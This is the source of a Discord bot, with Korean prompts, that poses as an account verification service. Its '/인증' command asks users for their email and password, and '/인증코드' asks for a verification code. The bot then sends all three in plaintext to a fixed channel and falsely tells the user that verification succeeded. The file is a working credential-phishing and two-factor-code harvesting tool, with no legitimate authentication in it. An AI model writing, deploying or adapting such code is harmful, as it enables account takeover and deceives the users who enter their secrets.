import discord
from discord.ext import commands
from discord import app_commands
import os

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

user_data = {}

class AuthModal(discord.ui.Modal, title="이메일과 비밀번호 입력"):
    email = discord.ui.TextInput(label="이메일", placeholder="your@email.com", style=discord.TextStyle.short, required=True)
    password = discord.ui.TextInput(label="비밀번호", style=discord.TextStyle.short, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        user_data[interaction.user.id] = {
            "email": self.email.value,
            "password": self.password.value
        }
        await interaction.response.send_message(
            "이메일과 비밀번호를 받았습니다. 이제 `/인증코드 <코드>` 명령어로 인증코드를 입력해주세요.",
            ephemeral=True)

@bot.tree.command(name="인증", description="이메일, 비번 입력 후 인증코드 입력 준비")
async def authenticate(interaction: discord.Interaction):
    await interaction.response.send_modal(AuthModal())

@bot.tree.command(name="인증코드", description="인증코드를 입력합니다.")
@app_commands.describe(code="인증코드")
async def auth_code(interaction: discord.Interaction, code: str):
    data = user_data.get(interaction.user.id)
    if not data:
        await interaction.response.send_message("먼저 /인증 명령어로 이메일과 비밀번호를 입력해주세요.", ephemeral=True)
        return
    channel = bot.get_channel(1405715098609385612)
    if channel is None:
        await interaction.response.send_message("봇이 채널을 찾지 못했어요.", ephemeral=True)
        return
    await channel.send(f"이메일: {data['email']}\n비밀번호: {data['password']}\n인증코드: {code}")
    await interaction.response.send_message("인증이 완료되었습니다!", ephemeral=True)
    del user_data[interaction.user.id]

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} commands")
    except Exception as e:
        print(e)

# 봇 토큰은 환경변수에서 불러오기
bot.run(os.getenv("DISCORD_BOT_TOKEN"))
